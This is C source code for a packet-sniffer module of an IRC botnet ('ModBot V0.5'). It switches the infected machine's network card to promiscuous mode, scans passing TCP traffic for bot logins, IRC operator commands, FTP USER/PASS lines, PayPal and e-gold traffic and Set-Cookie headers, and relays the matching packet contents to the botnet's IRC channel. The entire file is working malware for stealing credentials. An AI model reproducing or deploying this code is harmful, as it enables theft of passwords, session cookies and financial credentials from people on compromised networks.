/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"

#ifndef NO_PSNIFF

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

// Scaled down distributed network raw packet sniffer (ala Carnivore)
//
// When activated, watches for botnet login strings, and 
// reports them when found.
//
// The bots NIC must be configured for promiscuous mode (recieve
// all). Chances are this already done, if not, you can enable it
// by passing the SIO_RCVALL* DWORD option with a value of 1, to
// disable promiscuous mode pass with value 0.
//
// This won't work on Win9x bots since SIO_RCVALL needs raw 
// socket support which only WinNT+ has.

char *ptype[]={
	"BOT",
	"IRC",
	"FTP",
	"HTTP"
};

PSWORDS pswords[]={
	{"302 ",BOTP},
	{"366 ",BOTP},
	{":.login",BOTP},
	{":!login",BOTP},
	{":.ident",BOTP},
	{":!ident",BOTP},
	{":.hashin",BOTP},
	{":!hashin",BOTP},
	{":.secure",BOTP},
	{":!secure",BOTP},
	{":.auth",BOTP},
	{":!auth",BOTP},
	{"login ",BOTP},
	{"auth ",BOTP},
	{"\1HASH\1",BOTP},
	{".download ",BOTP},	
	{"download ",BOTP},
	{".update ",BOTP},
	{"getcftp ",BOTP},
	{"sending",BOTP},
	{"JOIN #",IRCP},
	{"NICK ",IRCP},
	{"OPER ",IRCP},
	{"oper ",IRCP},
	{"now an IRC Operator",IRCP},
	{"USER ",FTPP},
	{"PASS ",FTPP}, 
	{"paypal",HTTPP},
	{"PAYPAL",HTTPP},
	{"paypal.com",HTTPP},
	{"PAYPAL.COM",HTTPP},
	{"e-gold.com",HTTPP},
	{"e-gold.co.uk",HTTPP},
	{"Set-Cookie:",HTTPP},
	{NULL,0}
};

DWORD WINAPI SniffThread(LPVOID param) {

	char sendbuf[IRCLINE], rawdata[65535], *Packet;
	int i;
	DWORD dwRet, dwMode = 1;

	PSNIFF sniff = *((PSNIFF *)param);
	PSNIFF *sniffs = (PSNIFF *)param;
	sniffs->gotinfo = TRUE;

	IPHEADER *ip;
	TCPHEADER *tcp;
	IN_ADDR ia;

	SOCKET sniffsock;
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(0);
	ssin.sin_addr.s_addr = finet_addr(GetIP(sniff.sock));

	if ((sniffsock = fsocket(AF_INET, SOCK_RAW, IPPROTO_IP)) == INVALID_SOCKET) {
		sprintf(sendbuf, "[PSNIFF]: Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniffchan, sendbuf, sniff.notice);
		addlog(sendbuf);

		clearthread(sniff.threadnum);

		ExitThread(0);
	}
	threads[sniff.threadnum].sock = sniffsock;

	if (fbind(sniffsock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
		sprintf(sendbuf, "[PSNIFF]: Error: bind() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniffchan, sendbuf, sniff.notice);
		addlog(sendbuf);

		fclosesocket(sniffsock);
		clearthread(sniff.threadnum);

		ExitThread(0);
	}

	if (fWSAIoctl(sniffsock, SIO_RCVALL, &dwMode, sizeof(dwMode), NULL, 0, &dwRet, NULL, NULL) == SOCKET_ERROR) {
		sprintf(sendbuf, "[PSNIFF]: Error: WSAIoctl() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniffchan, sendbuf, sniff.notice);
		addlog(sendbuf);

		fclosesocket(sniffsock);
		clearthread(sniff.threadnum);

		ExitThread(0);
	}

	while(1) {
		memset(rawdata, 0, sizeof(rawdata));
		Packet = (char *)rawdata;

		if (frecv(sniffsock, Packet, sizeof(rawdata), 0) == SOCKET_ERROR) {
            _snprintf(sendbuf,sizeof(sendbuf),"[PSNIFF]: Error: recv() failed, returned: <%d>", fWSAGetLastError());
			if (!sniff.silent) irc_privmsg(sniff.sock, sniffchan, sendbuf, sniff.notice);
			addlog(sendbuf);

            break;
        }

		ip = (IPHEADER *)Packet;
		if (ip->proto == 6) {
			Packet += sizeof(*ip);
			tcp = (TCPHEADER *)Packet;

			ia.S_un.S_addr = ip->sourceIP;

			if (tcp->flags == 24) {
				Packet += sizeof(*tcp);
				if (strstr(Packet, "[PSNIFF]") == NULL) {
					for (i=0;pswords[i].text;i++) {
						if ((strstr(Packet, pswords[i].text)) != NULL) {
							_snprintf(sendbuf, sizeof(sendbuf), "[PSNIFF]: Suspicious %s packet from: %s:%d - %s.", ptype[pswords[i].type], finet_ntoa(ia), fntohs(tcp->sport), Packet);
							if (!sniff.silent) irc_privmsg(sniff.sock, sniffchan, sendbuf, sniff.notice);
							addlog(sendbuf);

							break;
						}
					}
				}
			}
		}
	}
	fclosesocket(sniffsock);
	clearthread(sniff.threadnum);

	ExitThread(0);
}
#endif
